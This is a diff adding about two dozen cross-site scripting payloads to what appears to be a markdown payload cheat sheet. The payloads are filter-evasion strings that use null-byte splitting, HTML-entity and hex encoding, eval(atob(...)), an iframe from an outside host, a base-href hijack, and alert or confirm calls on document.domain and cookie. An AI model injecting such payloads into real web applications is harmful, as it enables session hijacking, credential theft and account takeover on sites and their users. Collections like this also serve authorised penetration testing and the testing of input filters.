@@ -71,6 +71,34 @@ javascript:alert(document.domain)
 %27x%27onclick=%27alert(1)
 onMouseOvER=prompt(/xss/)//
 %27%20onclick=alert(document.domain)%20accesskey=X%20
+%3Cmarquee%20loop=1%20width=%271%26apos;%27onfinish=self[`al`+`ert`](1)%3E%23leet%3C/marquee%3E
+asd"on+<>+onpointerenter%3d"x%3dconfirm,x(cookie)
+<s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
+<// style=x:expression\28write(1)\29>
+<!--[if]><script>alert(1)</script -->
+<a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>@cr:0xInfection
+<script>eval(atob(decodeURIComponent("payload")))//
+<a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere
+<svg onx=() onload=(confirm)(1)>
+<a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+1'"><img/src/onerror=.1|alert``>
+<--`<img/src=` onerror=confirm``> --!>
+javascript:{alert`0`}
+<base href=//knoxss.me?
+<a69/onclick=[1].findIndex(alert)>sussy
+<input/oninput='new Function`confir\u006d\`0\``'>
+<p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme
+<svg/onload=prompt(1);>
+<isindex action="javas&tab;cript:alert(1)" type=image>
+<marquee/onstart=confirm(2)>
+3&clave=%3Cimg%20src=%22WTF%22%20onError=%22{
+0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C
+<table background="javascript:alert(1)"></table>
+"/><marquee onfinish=confirm(123)>a</marquee>
+
 ```
 
 ## XSS + SSRF <br>
